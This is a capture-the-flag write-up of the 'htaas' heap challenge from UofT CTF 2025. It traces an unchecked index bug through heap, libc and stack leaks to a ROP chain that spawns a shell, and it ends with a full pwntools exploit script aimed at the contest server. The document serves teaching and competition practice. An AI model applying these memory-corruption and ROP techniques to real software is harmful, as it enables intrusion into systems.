+++
title = 'htaas - UofT CTF 2025'
date = 2025-01-15T19:58:53+01:00
draft = false
+++

while playing UofTCTF I solved hash table as a service (htaas).
we were given a simple heap menu, which lets us create, get and set hash table entries:
```
1. New Hash Table
2. Set
3. Get
4. Exit
> 
```
upon inspecting the source, we spot some interesting things. there is an array that contains `hashTable`s,
i.e. it contains the number of entries in the hash table and its start address:
```
0x5c1e1caad040 <hashTables>:	0x0000000000000010	0x00005c1e4f4072a0
0x5c1e1caad050 <hashTables+16>:	0x0000000000000000	0x0000000000000000
...
```
each `hashTable` consits of `n` entries, which look like this:
```c
struct entry {
    int idx;
    char value[8];
}
```

now that the structures are clear, we can look at the bugs. there is clearly a missing check
in get and set functionality on the index for a hash table. in theory it can be any value:
```c
printf("Index: ");
__isoc99_scanf("%d", &v4);
printf("Key: ");
__isoc99_scanf("%d", &v5);
HashTable = getHashTable((char *)&hashTables + 16 * (int)v4, v5);
```
however we are limited by the method of retrieving the `HashTable` in `getHashTable`:
```c
__int64 __fastcall getHashTable(_QWORD *entry, int key)
{
  unsigned __int64 v3; // [rsp+10h] [rbp-10h]
  __int64 v4; // [rsp+18h] [rbp-8h]

  v3 = (unsigned __int64)key % *entry;
  v4 = entry[1];
  while ( key != *(_DWORD *)(12 * v3 + v4) && memcmp(&empty, (const void *)(12 * v3 + v4), 0xCuLL) )
    ++v3;
  return 12 * v3 + v4;
}
```
any malicious data we reach with a negative index for example have to satisfy following conditions:
- `*entry` has to contain a valid hash table size
- `*entry+8` has to contain a valid pointer
it was pretty difficult to find a valid target around the `hashTable` array, but there was something:
```
0x5c1e1caacd70:	0x00005c1e1caaa260	0x00005c1e1caaa220
```
this will satisfy the conditions above. since value at `*entry` is so large, `v3` will be the same as `key`.
that will require the `key` of the hash table me the same as its offset to the beginning in 
order to receive an entry. this seems pretty specific, but can be achieved in the `hashTable`
array, since we can freely control the number of entries in a `hashTable`. upon carefully crafting a negative index and size for a hash table we come up with this:
```py
create(0, 0x3d8)
set_map(-45, 0x3d8, b"AAAAAAAA")
get_map(-45, 0x3d8)
```
this will let us control 4 bytes of the pointer to `hashTable` entries:
```
0x5736c7f82040 <hashTables>:	0x41414141000003d8	0x0000573641414141
```
now we can have (heap) oob writes, since if an address contains `0xc` null bytes, we can
write to it no matter the key. however to get arbitrary reads, a valid `key` has to be preceeding
the value.

luckily we have enough control on the heap, so I decided to corrupt the top chunk and prepare
a proper key in front of libc addresses to be leaked. this leaks a libc address:
```py
heap = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
target = heap + 0x2df8
target2 = target + 0x8
target3 = target2 + 0x8

set_map(-45, 0x3d8, b"AAAA" + p32(target))

set_map(0, 3, p64(0x300000000))
set_map(-45, 0x3d8, b"AAAA" + p32(target2))

set_map(0, 3, p64(0xf41))
create(1, 0x3d8)

set_map(0, 3, p64(0x300000000))
set_map(-45, 0x3d8, b"AAAA" + p32(target3))
get_map(0, 3)

p.recvuntil(b"Value: ")
libc = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
```
because of the new libc I decided to corrupt the stack. to retrieve a stack leak, I wrote
some correct index right before `environ` and was able to leak it:
```py
before_environ = libc_base + 0x20ad40

set_map(-45, 0x3db, p64(before_environ))
set_map(2, 1, p64(0x200000000))

set_map(-45, 0x3db, p64(before_environ-0x4))

get_map(2, 2)

p.recvuntil(b"Value: ")
stack = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
```
we're lucky, since the `key` right before the saved return address contains `0x7fff`, which
is valid (and actually the uper 32-bits of saved `rbp`). with that we can prepare the stack
to be able to write more data to it and hold our ropchain. we get a shell:
```
[+] Starting local process './chall': pid 1991
0x34a4e2a0
0x7a3224400000
0x7ffe4e495508
[*] Switching to interactive mode
 $ ls
Dockerfile  chall.id0  chall.id2  chall.til		libc.so.6  x.py
chall	    chall.id1  chall.nam  ld-linux-x86-64.so.2	run
$ 
```
the full exploit is:
```py
from pwn import *

def create(idx, sz):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Size", str(sz).encode())

def set_map(idx, key, value):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Key", str(key).encode())
    p.sendafter(b"Value", value)

def get_map(idx, key):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Index", str(idx).encode())
    p.sendlineafter(b"Key", str(key).encode())

#p = process("./chall")
p = remote("34.162.33.160", 5000)

create(0, 0x3d8)
set_map(-45, 0x3d8, b"AAAA")
get_map(-45, 0x3d8)

p.recvuntil(b"AAAA")
heap = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
target = heap + 0x2df8
target2 = target + 0x8
target3 = target2 + 0x8
print(hex(heap))
p.unrecv(b">")

set_map(-45, 0x3d8, b"AAAA" + p32(target))

set_map(0, 3, p64(0x300000000))
set_map(-45, 0x3d8, b"AAAA" + p32(target2))

set_map(0, 3, p64(0xf41))
create(1, 0x3d8)

set_map(0, 3, p64(0x300000000))
set_map(-45, 0x3d8, b"AAAA" + p32(target3))
get_map(0, 3)

p.recvuntil(b"Value: ")
libc = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
libc_base = libc - 0x203b20
before_environ = libc_base + 0x20ad40
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f
pop_rdi = libc_base + 0x10f75b
ret = libc_base + 0x2882f
print(hex(libc_base))
p.unrecv(b">")

set_map(-45, 0x3db, p64(before_environ))
set_map(2, 1, p64(0x200000000))

set_map(-45, 0x3db, p64(before_environ-0x4))

get_map(2, 2)

p.recvuntil(b"Value: ")
stack = u64(p.recvuntil(b">")[:-1].ljust(8, b"\x00"))
rip = stack - 0x130
initial_rip_addr = (rip - 0x4) - (stack >> 32)*0xc
print(hex(stack))
p.unrecv(b">")

set_map(-45, 0x3db, p64(initial_rip_addr))
set_map(2, (stack >> 32), p64(0x100000000))

set_map(-45, 0x3db, p64(rip+0x4-0xc))
set_map(2, 1, p64(0x100000000))

set_map(-45, 0x3db, p64(rip+0x8+0x4-0xc))
set_map(2, 1, p64(0x100000000))

set_map(-45, 0x3db, p64(rip+0x10+0x4-0xc))
set_map(2, 1, p64(system))

set_map(-45, 0x3db, p64(rip+0x8+0x4-0xc))
set_map(2, 1, p64(binsh))

set_map(-45, 0x3db, p64(rip+0x4-0xc))
set_map(2, 1, p64(pop_rdi))

set_map(-45, 0x3db, p64(initial_rip_addr)) 
set_map(2, (stack >> 32), p64(ret))

p.sendlineafter(b">", b"4")

p.interactive()
```